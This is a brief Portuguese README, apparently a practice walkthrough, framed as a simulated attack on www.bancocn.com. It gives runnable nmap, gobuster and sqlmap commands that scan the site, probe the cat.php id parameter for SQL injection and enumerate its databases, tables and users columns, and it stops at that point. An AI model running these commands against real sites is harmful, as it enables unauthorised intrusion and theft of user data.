# Simulação de ataque a um site
## Ferramentas utilizadas no ataque :
## 1) Kali Linux -> Sistema Operacional  
## 2) nmap -> 


# Site alvo do ataque : [LINK](http://www.bancocn.com)

# Passos para invasão

## Explorando vulnerabilidades
### 1) Network Mapper(NMAP) descobre quais portas estão abertas e quais serviços estão sendo executados nessas portas.
```json
nmap bancocn.com -sV -A
```
### 2) Gobuster descoberta e enumeração de diretórios em servidores web.
```json
gobuster dir -u http://www.bancocn.com/ -w /usr/share/wordlists/dirb/commom.txt -x php,xml,html,sql,txt -t 50
```
### 3) Vamos adicionar parametros a url para tentar quebrar a requisição adicionando um ' ao lado do parametro que é o id
```json
http://www.bancocn.com/cat.php?id=1'
```
### Assim vemos uma mensagem que indica que o site usa MariaDB como banco de dados com essa infomação iremos preparar um ataque de injeção sql
```json
sqlmap -u "www.bancocn.com/cat.php?id=1" --dbs --batch
```
```json
sqlmap -u "www.bancocn.com/cat.php?id=1" -D bancocn --tables
```
```json
sqlmap -u "www.bancocn.com/cat.php?id=1" -D bancocn -T users --columns
```

